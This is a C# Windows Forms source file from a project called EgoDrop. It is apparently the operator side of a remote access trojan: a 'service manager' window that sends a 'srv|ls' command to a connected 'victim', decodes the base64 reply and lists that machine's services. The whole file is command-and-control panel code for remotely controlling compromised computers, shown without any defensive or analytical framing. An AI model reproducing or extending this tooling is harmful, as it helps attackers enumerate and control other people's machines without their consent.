using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmSrvMgr : Form
    {
        public clsVictim m_victim { get; set; }

        public frmSrvMgr(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        private void fnRecv(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
        {
            if (!clsTools.fnbSameVictim(victim, m_victim))
                return;

            Invoke(new Action(() =>
            {
                if (lsMsg[0] == "srv")
                {
                    if (lsMsg[1] == "ls")
                    {
                        var ls2d = clsEZData.fn2dLB64Decode(lsMsg[2]);
                        foreach (var ls in ls2d)
                        {
                            MessageBox.Show(ls[0]);
                        }
                    }
                }
            }));
        }

        private void fnGetServices()
        {
            m_victim.fnSendCommand("srv|ls");
        }

        void fnSetup()
        {
            m_victim.m_listener.evtReceivedMessage += fnRecv;

            fnGetServices();
        }

        private void frmSrvMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmSrvMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.evtReceivedMessage -= fnRecv;
        }
    }
}
